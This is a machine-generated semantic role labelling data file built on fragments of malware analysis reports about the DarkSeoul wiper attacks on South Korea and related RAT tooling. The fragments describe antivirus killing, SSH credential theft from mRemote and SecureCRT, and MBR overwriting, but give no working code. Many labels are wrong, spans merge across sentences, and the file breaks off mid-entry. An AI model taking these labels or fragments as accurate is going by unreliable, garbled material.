from a DLL Loader ) MatrixMain"}}, "called_2": {"ARG1": {"text": "the Gen 2 RAT ("}, "V": {"text": "called", "index": 20}, "ARG2": {"text": "from a DLL Loader ) MatrixMain"}}, "generate": {"ARGM-TMP": {"text": "ultimately"}, "V": {"text": "generate", "index": 31}, "ARG1": {"text": "a new thread ("}, "ARGM-MNR": {"text": "using the POSIX API function beginthreadex"}}, "using": {"V": {"text": "using", "index": 36}, "ARG1": {"text": "the POSIX API function beginthreadex instead of"}}, "contains": {"ARG0": {"text": "the more common CreateThread )"}, "R-ARG0": {"text": "that"}, "V": {"text": "contains", "index": 50}, "ARG1": {"text": "the main loop of the Gen 2 RAT functionality"}}}, " The Driver intercepts any and all network communication that traverses the Windows\nnetwork stack and potentially removes the data from the network stack under very specific conditions": {"intercepts": {"ARG0": {"text": "The Driver"}, "V": {"text": "intercepts", "index": 2}, "ARG1": {"text": "any and all network communication that traverses the Windows network stack and potentially removes the data from the network stack under very specific conditions"}}, "traverses": {"ARG0": {"text": "any and all network communication"}, "R-ARG0": {"text": "that"}, "V": {"text": "traverses", "index": 9}, "ARG1": {"text": "the Windows network stack"}}, "removes": {"ARG0": {"text": "any and all network communication"}, "R-ARG0": {"text": "that"}, "ARGM-ADV": {"text": "potentially"}, "V": {"text": "removes", "index": 16}, "ARG1": {"text": "the data from the network stack under very specific conditions"}}}, " This is a surprisingly\ninvasive method to obfuscate a process": {"is": {"ARG1": {"text": "This"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "a surprisingly invasive method to obfuscate a process"}}, "obfuscate": {"V": {"text": "obfuscate", "index": 7}, "ARG1": {"text": "a process"}}}, " This allows an attacker to establish several Gen2 infections within a victim\u2019s\ninfrastructure and if outbound connectivity is prohibited for any of the infected machines, the attacker\ncan route commands to the pseudo-isolated infections through accessible infected machines providing\na high level of persistence to the malware": {"allows": {"ARG0": {"text": "This"}, "V": {"text": "allows", "index": 1}, "ARG1": {"text": "an attacker to establish several Gen2 infections within a victim \u2019s infrastructure"}}, "establish": {"ARG0": {"text": "an attacker"}, "V": {"text": "establish", "index": 5}, "ARG1": {"text": "several Gen2 infections within a victim \u2019s infrastructure"}}, "is": {"V": {"text": "is", "index": 18}}, "prohibited": {"ARG1": {"text": "outbound connectivity"}, "V": {"text": "prohibited", "index": 19}, "ARG2": {"text": "for any of the infected machines"}}, "infected": {"V": {"text": "infected", "index": 24}, "ARG1": {"text": "machines"}}, "can": {"ARGM-ADV": {"text": "if outbound connectivity is prohibited for any of the infected machines"}, "ARG0": {"text": "the attacker"}, "V": {"text": "can", "index": 29}, "ARG1": {"text": "route commands/ infections through accessible infected machines providing a high level of persistence to the malware"}, "ARG2": {"text": "to the pseudo - isolated"}}, "route": {"ARGM-ADV": {"text": "if outbound connectivity is prohibited for any of the infected machines"}, "ARG0": {"text": "the attacker"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "route", "index": 30}, "ARG1": {"text": "commands"}, "ARG2": {"text": "to the pseudo - isolated infections"}, "ARGM-MNR": {"text": "through accessible infected machines providing a high level of persistence to the malware"}}, "isolated": {"V": {"text": "isolated", "index": 36}, "ARG1": {"text": "infections"}}, "providing": {"ARG0": {"text": "accessible infected machines"}, "V": {"text": "providing", "index": 42}, "ARG1": {"text": "a high level of persistence"}, "ARG2": {"text": "to the malware"}}}, " The Gen 1 Driver listens to network traffic arriving at the local\nnetwork interface and waits for a specific trigger string": {"listens": {"ARG0": {"text": "The Gen 1 Driver"}, "V": {"text": "listens", "index": 4}, "ARG1": {"text": "to network traffic arriving at the local network interface and waits for a specific trigger string"}}, "arriving": {"ARG1": {"text": "network traffic"}, "V": {"text": "arriving", "index": 8}, "ARG4": {"text": "at the local network interface"}}}, "\n</section>\n<section>\n<heading>Win32 Wiper component</heading>\n\nWhen the AgentBase.exe component is executed, it first attempts to stop the following processes,\npresumably in order to evade detection:\n<list>\n\u2022 pasvc.exe \u2013 policy agent from AhnLab\n\u2022 clisvc.exe \u2013 ViRobot ISMS from Hauri\n</list>\nIt then enumerates": {"enumerates": {"ARG1": {"text": "It"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "enumerates", "index": 2}}}, "\nexe and conime.exe to attempt to connect remote servers, upload and run the bash script\n~pr1.tmp": {"attempt": {"ARG0": {"text": "exe and conime.exe"}, "V": {"text": "attempt", "index": 4}, "ARG1": {"text": "to connect remote servers , upload and run the bash script ~pr1.tmp"}}, "connect": {"ARG0": {"text": "exe"}, "V": {"text": "connect", "index": 6}, "ARG1": {"text": "remote servers"}}, "upload": {"ARG0": {"text": "exe and conime.exe"}, "V": {"text": "upload", "index": 10}, "ARG1": {"text": "the bash script ~pr1.tmp"}}, "run": {"ARG0": {"text": "exe and conime.exe"}, "V": {"text": "run", "index": 12}, "ARG1": {"text": "the bash script ~pr1.tmp"}}}, "\n</section>\n<section>\n<heading>Installation</heading>\n\nWhen executed it creates the following files in the affected user\u2019s %Temp% directory:\n<list>\n    \u2022   alg.exe: A legitimate binary used to open SSH connections with remote servers\n        MD5 e45cd9052dd3dd502685dfd9aa2575ca\u2028\n        Size: 166,912 bytes\n    \u2022   conime.exe: A legitimate binary used to open SSH connections with remote servers\n        MD5: 6a702342e8d9911bde134129542a045b\u2028\n        Size: 153,600 bytes\n    \u2022   ~pr1.tmp: Payload - A destructive bash script\n        MD5: dc789dee20087c5e1552804492b042cd\n        Size: 1,186 bytes\u2028\n        Also known as/detected as: \u2028\n                 KillMBR-FBIA (McAfee)\n                 Trojan:SH/Kofornix.A (Microsoft)\n                 Trojan.Jokra (Symantec)\n    \u2022   AgentBase.exe: Payload - Win32 wiper component (see details below)\n        MD5: db4bbdc36a78a8807ad9b15a562515c4\u2028\n        Size: 24,576 \u2028\n</list>\n</section>\n<section>\n<heading>Payload\u2014attempts to connect to remote servers and upload a destructive bash script \u2028</heading>\n\nAfter determining the location of user profile directories on the affected computer, the malware\nsearches these directories for configuration files and directories that may be associated with the\nconnection manager clients mRemote and SecureCRT": {"determining": {"V": {"text": "determining", "index": 1}, "ARG1": {"text": "the location of user profile directories on the affected computer"}, "ARG0": {"text": "the malware"}}, "searches": {"ARGM-TMP": {"text": "After determining the location of user profile directories on the affected computer"}, "ARG0": {"text": "the malware"}, "V": {"text": "searches", "index": 15}, "ARG1": {"text": "these directories for configuration files and directories that may be associated with the connection manager clients mRemote and SecureCRT"}}, "may": {"V": {"text": "may", "index": 24}}, "be": {"V": {"text": "be", "index": 25}}, "associated": {"ARG1": {"text": "configuration files and directories"}, "R-ARG1": {"text": "that"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "associated", "index": 26}, "ARG2": {"text": "with the connection manager clients mRemote and SecureCRT"}}}, "\n": {}, "\n</section>\n<section>\n<heading>Win32 Wiper component</heading>\n\nWhen the AgentBase.exe component": {}, " The malware attempted to disable AhnLab and Hauri AV antivirus products then\nproceeded to overwrite the master boot record (MBR)": {"attempted": {"ARG0": {"text": "The malware"}, "V": {"text": "attempted", "index": 2}, "ARG1": {"text": "to disable AhnLab and Hauri AV antivirus products"}}, "disable": {"ARG0": {"text": "The malware"}, "V": {"text": "disable", "index": 4}, "ARGM-DIS": {"text": "AhnLab"}}, "proceeded": {"ARG0": {"text": "The malware"}, "ARGM-PRD": {"text": "attempted to disable AhnLab and Hauri AV antivirus products"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "proceeded", "index": 12}, "ARG1": {"text": "to overwrite the master boot record ( MBR )"}}, "overwrite": {"ARG0": {"text": "The malware/ antivirus products"}, "V": {"text": "overwrite", "index": 14}, "ARG1": {"text": "the master boot record ( MBR )"}}}, " The upload server vector included a time-based logic bomb that allowed the wiper\nto target a large number of systems, on a set time and date, with full permissions on all of the\ntargeted systems.<fn>383</fn>\n\nAccording to CrowdStrike, the wiper malware was dropped on the systems as AgentBase.exe": {"included": {"ARG2": {"text": "The upload server vector"}, "V": {"text": "included", "index": 4}, "ARG1": {"text": "a time - based logic bomb that allowed the wiper to target a large number of systems , on a set time and date , with full permissions on all of the targeted systems"}}, "based": {"ARGM-TMP": {"text": "time"}, "V": {"text": "based", "index": 8}, "ARG1": {"text": "logic bomb"}}, "allowed": {"ARG0": {"text": "a time - based logic bomb"}, "R-ARG0": {"text": "that"}, "V": {"text": "allowed", "index": 12}, "ARG1": {"text": "the wiper to target a large number of systems , on a set time and date , with full permissions on all of the targeted systems"}}, "target": {"ARG0": {"text": "the wiper"}, "V": {"text": "target", "index": 16}, "ARG1": {"text": "a large number of systems"}, "ARGM-TMP": {"text": "on a set time and date"}, "ARG2": {"text": "with full permissions on all of the targeted systems"}}, "set": {"V": {"text": "set", "index": 25}, "ARG1": {"text": "time"}}, "targeted": {"V": {"text": "targeted", "index": 37}, "ARG1": {"text": "systems"}}, "According": {"V": {"text": "According", "index": 40}}, "was": {"V": {"text": "was", "index": 47}}, "dropped": {"ARGM-ADV": {"text": "According to CrowdStrike/ as AgentBase.exe"}, "ARG1": {"text": "the wiper malware"}, "V": {"text": "dropped", "index": 48}, "ARG2": {"text": "on the systems"}}}, " The\noperation was codenamed \u201cTroy\u201d due to the frequent use of the word \u201cTroy\u201d in the malware\u2019s\ncompile path strings.<fn>335</fn> The malware used in these attacks sought out and exfiltrated data, based\non keyword searches": {"was": {"V": {"text": "was", "index": 2}}, "codenamed": {"ARG2": {"text": "The operation"}, "V": {"text": "codenamed", "index": 3}, "ARG1": {"text": "\u201c Troy \u201d"}, "ARGM-CAU": {"text": "due to the frequent use of the word \u201c Troy \u201d in the malware \u2019s compile path strings . The malware used in these attacks sought out and exfiltrated data , based on keyword searches"}}, "used": {"ARG1": {"text": "The malware"}, "V": {"text": "used", "index": 28}, "ARGM-LOC": {"text": "in these attacks"}}, "sought": {"ARG1": {"text": "The malware used in these attacks"}, "V": {"text": "sought", "index": 32}, "ARGM-CAU": {"text": "based on keyword searches"}}, "exfiltrated": {"ARG0": {"text": "The malware"}, "ARGM-LOC": {"text": "in these attacks"}, "V": {"text": "exfiltrated", "index": 35}, "ARG1": {"text": "data"}, "ARGM-CAU": {"text": "based on keyword searches"}}, "based": {"ARG1": {"text": "exfiltrated data"}, "V": {"text": "based", "index": 38}, "ARG2": {"text": "on keyword searches"}}}, " This RAT is detected by Symantec as Backdoor.Prioxer": {"is": {"V": {"text": "is", "index": 2}}, "detected": {"ARG1": {"text": "This RAT"}, "V": {"text": "detected", "index": 3}, "ARG0": {"text": "by Symantec"}, "ARGM-ADV": {"text": "as Backdoor . Prioxer"}}}, " IssueMakersLab found that these actors consistently\nused the same 16-digit password for file compression, the same stage 1 C2 protocol, the same\ncollection keywords and encryption keys, and the same development path.<fn>343</fn> According to South\nKorea\u2019s Korea Internet and Security Agency, the North Korean IP address 175.45.178.xx was\nfound scanning South Korean routes the month before the attacks,<fn>344</fn> and the same IP was\nreportedly logged as accessing one of the targets 13 times.<fn>345</fn> Details of the March 20 attack also\nsuggested possible ties to China": {"found": {"ARG0": {"text": "IssueMakersLab"}, "V": {"text": "found", "index": 1}, "ARG1": {"text": "that these actors consistently used the same 16-digit password for file compression , the same stage 1 C2 protocol , the same collection keywords and encryption keys , and the same development path . Details of the March 20 attack also suggested possible ties to China"}}, "used": {"ARG0": {"text": "these actors"}, "ARGM-MNR": {"text": "consistently"}, "V": {"text": "used", "index": 6}, "ARG1": {"text": "the same 16-digit password for file compression , the same stage 1 C2 protocol , the same collection keywords and encryption keys , and the same development path"}}, "suggested": {"ARG0": {"text": "Details of the March 20 attack"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "suggested", "index": 43}, "ARG1": {"text": "possible ties to China"}}}, " \u2028\n\nIf an mRemote installation is located, the dropper reads the configuration file and checks if there\u2019s\na NODE that is defined with \u201cUsername=root\u201d, \u201cProtocol=SSH\u201d, and a password that is not blank": {"is": {"V": {"text": "is", "index": 4}}, "located": {"ARG1": {"text": "an mRemote installation"}, "V": {"text": "located", "index": 5}}, "reads": {"ARGM-ADV": {"text": "If an mRemote installation is located/ if there \u2019s a NODE that is defined with \u201c Username = root \u201d , \u201c Protocol = SSH \u201d , and a password that is not blank"}, "ARG0": {"text": "the dropper"}, "V": {"text": "reads", "index": 9}, "ARG1": {"text": "the configuration file and checks"}}, "is_2": {"V": {"text": "is", "index": 21}}, "defined": {"ARG1": {"text": "a NODE"}, "R-ARG1": {"text": "that"}, "V": {"text": "defined", "index": 22}, "ARG2": {"text": "with \u201c Username = root \u201d"}}, "is_3": {"ARG1": {"text": "a password"}, "R-ARG1": {"text": "that"}, "V": {"text": "is", "index": 40}, "ARGM-NEG": {"text": "not"}, "ARG2": {"text": "blank"}}}, "\n\nAccording to CrowdStrike, a third malware component downloaded an IRC RAT from various\ncompromised websites": {"According": {"V": {"text": "According", "index": 0}}, "downloaded": {"ARGM-ADV": {"text": "According to CrowdStrike"}, "ARG0": {"text": "a third malware component"}, "V": {"text": "downloaded", "index": 8}, "ARG1": {"text": "an IRC RAT from various compromised websites"}}, "compromised": {"V": {"text": "compromised", "index": 14}, "ARG1": {"text": "websites"}}}, " If\n\fthose conditions are satisfied it extracts the information": {"are": {"ARG1": {"text": "those conditions"}, "V": {"text": "are", "index": 3}, "ARG2": {"text": "satisfied"}}, "extracts": {"ARGM-ADV": {"text": "If those conditions are satisfied"}, "ARG0": {"text": "it"}, "V": {"text": "extracts", "index": 6}, "ARG1": {"text": "the information"}}}, "\n</section>\n<section>\n<heading>Win32 Wiper component</heading>\n\nWhen the AgentBase.exe component is executed, it first attempts to stop the following processes,\npresumably in order to evade detection:\n<list>\n\u2022 pasvc.exe \u2013": {}, " While the malware was clearly intended to search for and exfiltrate certain\ntypes of data, its true impact on the targets was never revealed": {"was": {"V": {"text": "was", "index": 3}}, "intended": {"ARG2": {"text": "the malware"}, "ARGM-ADV": {"text": "clearly"}, "V": {"text": "intended", "index": 5}, "ARG1": {"text": "to search for and exfiltrate certain types of data"}}, "search": {"ARG0": {"text": "the malware"}, "V": {"text": "search", "index": 7}, "ARG2": {"text": "for"}}, "exfiltrate": {"ARG0": {"text": "the malware"}, "V": {"text": "exfiltrate", "index": 10}, "ARG1": {"text": "certain types of data"}}, "was_2": {"V": {"text": "was", "index": 22}}, "revealed": {"ARGM-ADV": {"text": "While the malware was clearly intended to search for and exfiltrate certain types of data"}, "ARG1": {"text": "its true impact on the targets"}, "ARGM-TMP": {"text": "never"}, "V": {"text": "revealed", "index": 24}}}, " The attack was capable of wiping both\nLinux and Windows machines.<fn>341</fn> McAfee found that these attacks were the culmination of the\nmalware campaign they dubbed \u201cOperation Troy\u201d.<fn>342</fn>\n\nA report from IssueMakersLab tied the actors responsible for the March 20, 2013 attacks to cyber\nattack activity occurring as early as 2007": {"was": {"ARG1": {"text": "The attack"}, "V": {"text": "was", "index": 2}, "ARG2": {"text": "capable of wiping both Linux and Windows machines . A report from IssueMakersLab tied the actors responsible for the March 20 , 2013 attacks to cyber attack activity occurring as early as 2007"}}, "wiping": {"V": {"text": "wiping", "index": 5}, "ARG1": {"text": "both Linux and Windows machines . A report from IssueMakersLab tied the actors responsible for the March 20 , 2013 attacks to cyber attack activity occurring as early as 2007"}}, "tied": {"ARG0": {"text": "A report from IssueMakersLab"}, "V": {"text": "tied", "index": 16}, "ARG1": {"text": "the actors responsible for the March 20"}}, "occurring": {"ARG1": {"text": "cyber attack activity"}, "V": {"text": "occurring", "index": 31}, "ARGM-TMP": {"text": "as early as 2007"}}}, " AlienVault suspected the Chinese exploit kit GonDad was used to\nspread the malware, and the Korean domains serving the malware were registered using a\nChinese email address": {"suspected": {"ARG0": {"text": "AlienVault"}, "V": {"text": "suspected", "index": 1}, "ARG1": {"text": "the Chinese exploit kit GonDad was used to spread the malware"}}, "was": {"ARG1": {"text": "the Chinese exploit kit GonDad"}, "V": {"text": "was", "index": 7}, "ARG2": {"text": "used to spread the malware"}}, "used": {"ARG1": {"text": "the Chinese exploit kit GonDad"}, "V": {"text": "used", "index": 8}, "ARG2": {"text": "to spread the malware"}}, "spread": {"ARG0": {"text": "the Chinese exploit kit GonDad"}, "V": {"text": "spread", "index": 10}, "ARG1": {"text": "the malware"}}, "serving": {"ARG0": {"text": "the Korean domains"}, "V": {"text": "serving", "index": 18}, "ARG2": {"text": "the malware"}}, "were": {"V": {"text": "were", "index": 21}}, "registered": {"ARG1": {"text": "the Korean domains serving the malware"}, "V": {"text": "registered", "index": 22}, "ARGM-MNR": {"text": "using a Chinese email address"}}, "using": {"ARG0": {"text": "the Korean domains serving the malware"}, "V": {"text": "using", "index": 23}, "ARG1": {"text": "a Chinese email address"}}}, "\n</section>\n<section>\n<heading>Win32 Wiper component</heading>\n\nWhen the AgentBase.exe component is executed,": {"is": {"V": {"text": "is", "index": 4}}, "executed": {"ARGM-TMP": {"text": "When"}, "ARG1": {"text": "the AgentBase.exe component"}, "V": {"text": "executed", "index": 5}}}, " \u2028\n\nThe bash script initially checks which UNIX it is running on (of HP-UX, SunOS, Linux, or AIX) and\nthen attempts to wipe the /kernel, /usr /etc and /home directories, thus": {"UNIX": {"ARG0": {"text": "The bash script initially checks"}, "R-ARG0": {"text": "which"}, "V": {"text": "UNIX", "index": 6}, "ARG1": {"text": "it"}}, "is": {"V": {"text": "is", "index": 8}}, "running": {"R-ARG1": {"text": "which UNIX"}, "ARG0": {"text": "it"}, "V": {"text": "running", "index": 9}}, "attempts": {"ARG0": {"text": "The bash script initially checks which UNIX it is"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "attempts", "index": 26}, "ARG1": {"text": "to wipe the /kernel , /usr /etc and /home directories"}, "ARGM-DIS": {"text": "thus"}}, "wipe": {"ARG0": {"text": "The bash script initially checks which UNIX it is"}, "V": {"text": "wipe", "index": 28}, "ARG1": {"text": "the /kernel , /usr /etc and /home directories"}, "ARGM-DIS": {"text": "thus"}}}, "\n</section>\n<section>\n<heading>Win32 Wiper component</heading>\n\nWhen the AgentBase.exe component is executed, it first attempts to stop the following processes,\npresumably in order to evade detection:\n<list>\n\u2022 pasvc.exe \u2013 policy agent from AhnLab\n\u2022 clisvc.exe \u2013": {}, " The\nwiper used the Windows utility 'taskkill' to kill the processes pasvc.exe and clisvc.exe, which are\nthe main processes for the Ahnlab and Hauri antivirus applications.<fn>384</fn> <fn>385</fn> The wiper then\nperformed system reconnaissance, gathering drive information and operating system version": {"used": {"ARG0": {"text": "The wiper"}, "V": {"text": "used", "index": 2}, "ARG1": {"text": "the Windows utility ' taskkill '"}, "ARG2": {"text": "to kill the processes pasvc.exe and clisvc.exe , which are the main processes for the Ahnlab and Hauri antivirus applications . The wiper then performed system reconnaissance , gathering drive information and operating system version"}}, "kill": {"ARG0": {"text": "the Windows utility ' taskkill '"}, "V": {"text": "kill", "index": 10}, "ARG1": {"text": "the processes pasvc.exe and clisvc.exe"}}, "are": {"ARG1": {"text": "clisvc.exe"}, "R-ARG1": {"text": "which"}, "V": {"text": "are", "index": 18}, "ARG2": {"text": "the main processes for the Ahnlab and Hauri antivirus applications"}}, "performed": {"ARG0": {"text": "The wiper"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "performed", "index": 33}, "ARG1": {"text": "system reconnaissance , gathering drive information and operating system version"}}, "gathering": {"ARG0": {"text": "The wiper"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "gathering", "index": 37}, "ARG1": {"text": "drive information and operating system version"}}}, "\nDepending on the OS used, the wiper recursively deleted files on the file system, deleting the\nWindows folder last": {"Depending": {"V": {"text": "Depending", "index": 0}, "ARG1": {"text": "on the OS used"}}, "used": {"ARG1": {"text": "the OS"}, "V": {"text": "used", "index": 4}}, "deleted": {"ARGM-ADV": {"text": "Depending on the OS used"}, "ARG0": {"text": "the wiper recursively"}, "V": {"text": "deleted", "index": 9}, "ARG1": {"text": "files on the file system"}}, "deleting": {"V": {"text": "deleting", "index": 16}, "ARG1": {"text": "the Windows folder"}, "ARGM-EXT": {"text": "last"}}}, " <fn>327</fn></caption>\n\nIn May 2013, DarkSeoul malware was used to attack several South Korean financial institutions;\nand in June, DarkSeoul DDoS attacks were launched against the South Korean government\u2019s DNS\nserver": {"was": {"V": {"text": "was", "index": 6}}, "used": {"ARGM-TMP": {"text": "In May"}, "ARG1": {"text": "2013 , DarkSeoul malware"}, "V": {"text": "used", "index": 7}, "ARG2": {"text": "to attack several South Korean financial institutions"}}, "attack": {"ARG0": {"text": "2013 , DarkSeoul malware"}, "V": {"text": "attack", "index": 9}, "ARG1": {"text": "several South Korean financial institutions"}}, "were": {"V": {"text": "were", "index": 23}}, "launched": {"ARGM-TMP": {"text": "in June"}, "ARG1": {"text": "DarkSeoul DDoS attacks"}, "V": {"text": "launched", "index": 24}, "ARGM-GOL": {"text": "against the South Korean government \u2019s DNS server"}}}, " It then overwrote the MBR with the strings \"HASTATI\", \"PRINCPES\",\n\"PRINCIPES\", or \"PR!NCPES\u201d.<fn>386</fn>\n\nWhile there are several variants of the wiper, all seem to have been used on the same date": {"overwrote": {"ARG0": {"text": "It"}, "ARGM-TMP": {"text": "then"}, "ARG1": {"text": "the MBR with the strings \" HASTATI \" , \" PRINCPES \" , \" PRINCIPES \" , or \" PR!NCPES \u201d"}}, "are": {"V": {"text": "are", "index": 27}, "ARG1": {"text": "several variants of the wiper"}}, "seem": {"ARGM-ADV": {"text": "While there are several variants of the wiper"}, "ARG1": {"text": "all"}, "V": {"text": "seem", "index": 35}, "C-ARG1": {"text": "to have been used on the same date"}}, "have": {"V": {"text": "have", "index": 37}}, "been": {"V": {"text": "been", "index": 38}}, "used": {"V": {"text": "used", "index": 39}, "ARGM-TMP": {"text": "on the same date"}}}, " \u2028\n\nIf a SecureCRT installation is located, the dropper extracts information from sessions that have\nUsername=root, Protocol=SSH and a saved password": {"is": {"V": {"text": "is", "index": 4}}, "located": {"ARG1": {"text": "a SecureCRT installation"}, "V": {"text": "located", "index": 5}}, "have": {"ARG0": {"text": "sessions"}, "R-ARG0": {"text": "that"}, "V": {"text": "have", "index": 14}, "ARG1": {"text": "Username = root"}}, "saved": {"V": {"text": "saved", "index": 24}, "ARG1": {"text": "password"}}}, " The impact of the March 20 attacks included\ndisruption of service at financial institutions and data deletion": {"included": {"ARG2": {"text": "The impact of the March 20 attacks"}, "V": {"text": "included", "index": 7}, "ARG1": {"text": "disruption of service at financial institutions and data deletion"}}}, " As Yang had predicted, it wiped the client.<fn>382</fn> While the method for initial compromise of\nthe update server is not noted in detail, CrowdStrike\u2019s report cites \u201ccollateral information\u201d that\nsuggests targeted email attacks were used to gain initial entry, and policy servers were then\ncompromised": {"had": {"V": {"text": "had", "index": 2}}, "predicted": {"ARG0": {"text": "Yang"}, "V": {"text": "predicted", "index": 3}}, "wiped": {"ARGM-ADV": {"text": "As Yang had predicted/ While the method for initial compromise of the update server is not"}, "ARG0": {"text": "it"}, "V": {"text": "wiped", "index": 6}, "ARG1": {"text": "the client"}}, "is": {"V": {"text": "is", "index": 20}}, "noted": {"ARG1": {"text": "the method for initial compromise of the update server"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "noted", "index": 22}, "ARGM-MNR": {"text": "in detail"}}, "cites": {"ARGM-ADV": {"text": "While the method for initial compromise of the update server is not noted in detail"}, "ARG0": {"text": "CrowdStrike \u2019s report"}, "V": {"text": "cites", "index": 29}, "ARG1": {"text": "\u201c collateral information \u201d that suggests targeted email attacks were used to gain initial entry"}}, "suggests": {"ARG0": {"text": "\u201c collateral information \u201d"}, "R-ARG0": {"text": "that"}, "V": {"text": "suggests", "index": 35}, "ARG1": {"text": "targeted email attacks were used to gain initial entry"}}, "targeted": {"V": {"text": "targeted", "index": 36}, "ARG1": {"text": "email attacks"}}, "were": {"V": {"text": "were", "index": 39}}, "used": {"ARG1": {"text": "targeted email attacks"}, "V": {"text": "used", "index": 40}, "ARG2": {"text": "to gain initial entry"}}, "gain": {"V": {"text": "gain", "index": 42}, "ARG1": {"text": "initial entry"}}, "were_2": {"V": {"text": "were", "index": 49}}, "compromised": {"ARG1": {"text": "policy servers"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "compromised", "index": 51}}}, " In April 2012, the regime reportedly listed\n\n<box>According to statements\nfrom the South Korean\ngovernment, North\nKorea\u2019s Lab 110 were the\nactors behind the\nDarkSeoul malware\nattacks.</box>\n\n<footnote>\n330\n    http://edition.cnn.com/2014/07/02/world/asia/south-korea-xi-visit/index.html?hpt=hp_bn7\n331\n    http://mobile.nytimes.com/blogs/sinosphere/2014/07/07/q-and-a-john-delury-on-chinese-south-korean-ties/?smid=tw-share\n332\n    http://www.globalpost.com/dispatch/news/yonhap-news-agency/140825/n-korea-urges-un-action-against-s-korea-us-military-drill\n333\n    http://www.theguardian.com/world/2009/jul/11/south-korea-blames-north-korea-cyber-attacks\n334\n    http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/2\n335\n    http://www.darkreading.com/attacks-and-breaches/south-korean-bank-hackers-target-us-military-secrets/d/d-id/1110674?\n336\n    http://motherboard.vice.com/blog/the-dark-seoul-hackers-were-after-south-korean-military-secrets\n337\n    http://blogs.mcafee.com/wp-content/uploads/2011/07/McAfee-Labs-10-Days-of-Rain-July-2011.pdf\n338\n    http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war\n339\n    http://www.nytimes.com/2013/03/21/world/asia/south-korea-computer-network-crashes.html?pagewanted=all&_r=1&\n</footnote>\n\fthose entities as attack targets.<fn>340</fn> The malware used in the March 20, 2013 attacks were wiper\nmalware": {"listed": {"ARGM-TMP": {"text": "In April 2012"}, "ARG0": {"text": "the regime"}, "ARGM-ADV": {"text": "reportedly"}, "V": {"text": "listed", "index": 7}, "ARG1": {"text": "The malware used in the March 20"}}, "used": {"ARG1": {"text": "The malware"}, "V": {"text": "used", "index": 10}, "ARGM-TMP": {"text": "in the March 20"}}, "were": {"ARG1": {"text": "2013 attacks"}, "V": {"text": "were", "index": 18}, "ARG2": {"text": "wiper malware"}}}, "\n</section>\n<section>\n<heading>Win32 Wiper component</heading>\n\nWhen the AgentBase.exe component is executed, it first attempts to stop the following processes,\npresumably in order to evade detection:\n<list>\n\u2022": {}, "\n</section>\n<section>\n<heading>Win32 Wiper component</heading>\n\nWhen the AgentBase.exe component is executed, it first attempts to stop the following processes,\npresumably in order to evade detection:\n<list>\n\u2022 pasvc.exe \u2013 policy agent from AhnLab\n\u2022": {}, "\n\fMalware tries to communicate with": {"tries": {"ARG0": {"text": "Malware"}, "V": {"text": "tries", "index": 1}, "ARG1": {"text": "to communicate with"}}, "communicate": {"ARG0": {"text": "Malware"}, "V": {"text": "communicate", "index": 3}, "ARG2": {"text": "with"}}}, "\n\n<figure></figure> <caption> \f                                   Second Level Shell Code Analysis </caption>\n\nNow we have landed into the second level shellcode, but it is obfuscated to evade static analysis": {"have": {"V": {"text": "have", "index": 2}}, "landed": {"ARGM-TMP": {"text": "Now"}, "ARG1": {"text": "we"}, "V": {"text": "landed", "index": 3}, "ARGM-LOC": {"text": "into the second level shellcode"}}, "is": {"V": {"text": "is", "index": 12}, "ARG2": {"text": "obfuscated"}, "ARG1": {"text": "to evade static analysis"}}, "obfuscated": {"ARG1": {"text": "it"}, "V": {"text": "obfuscated", "index": 13}, "ARG0": {"text": "to evade static analysis"}}, "evade": {"V": {"text": "evade", "index": 15}, "ARG1": {"text": "static analysis"}}}, "\n\n\n\n\nIt's very time-consuming to understand the functionality of the dll as it decrypts and builds its own\nruntime import table to hinder the analysis": {"'s": {"V": {"text": "'s", "index": 1}, "ARG2": {"text": "very time - consuming"}, "ARG1": {"text": "to understand the functionality of the dll as it decrypts and builds its own runtime import table to hinder the analysis"}}, "consuming": {"ARGM-EXT": {"text": "very"}, "ARG1": {"text": "time"}, "V": {"text": "consuming", "index": 5}}, "understand": {"V": {"text": "understand", "index": 7}, "ARG1": {"text": "the functionality of the dll"}, "ARGM-TMP": {"text": "as it decrypts"}}, "decrypts": {"ARG0": {"text": "it"}, "V": {"text": "decrypts", "index": 15}}, "builds": {"V": {"text": "builds", "index": 17}, "ARG1": {"text": "its own runtime import table"}, "ARGM-PRP": {"text": "to hinder the analysis"}}, "hinder": {"V": {"text": "hinder", "index": 24}, "ARG1": {"text": "the analysis"}}}, "\n\fFinally we can see it\u2019s": {"can": {"V": {"text": "can", "index": 2}}, "see": {"ARGM-TMP": {"text": "Finally"}, "ARG0": {"text": "we"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "see", "index": 3}, "ARG1": {"text": "it \u2019s"}}, "\u2019s": {"ARG1": {"text": "it"}, "V": {"text": "\u2019s", "index": 5}}}, " The module\ntransmits the collected information in the body of the POST request and gets new commands from the\nserver\u2019s response": {"transmits": {"ARG0": {"text": "The module"}, "V": {"text": "transmits", "index": 2}, "ARG1": {"text": "the collected information"}, "ARGM-CAU": {"text": "in the body of the POST request"}}, "gets": {"ARG0": {"text": "The module"}, "V": {"text": "gets", "index": 14}, "ARG1": {"text": "new commands"}, "ARG2": {"text": "from the server \u2019s response"}}}, " When there is a file waiting for upload (usually,\nthis is file that contains the results of the previously received and executed command), it is read\nfrom disk and uploaded to the server instead of the system information": {"is": {"ARGM-TMP": {"text": "When"}, "V": {"text": "is", "index": 2}, "ARG1": {"text": "a file waiting for upload ( usually"}}, "waiting": {"ARG1": {"text": "a file"}, "V": {"text": "waiting", "index": 5}, "ARG2": {"text": "for upload ( usually"}}, "is_2": {"ARG1": {"text": "this"}, "V": {"text": "is", "index": 12}, "ARG2": {"text": "file"}, "C-ARG1": {"text": "that contains the results of the previously received"}}, "contains": {"ARG0": {"text": "file"}, "R-ARG0": {"text": "that"}, "V": {"text": "contains", "index": 15}, "ARG1": {"text": "the results of the previously received and executed command )"}}, "received": {"ARGM-TMP": 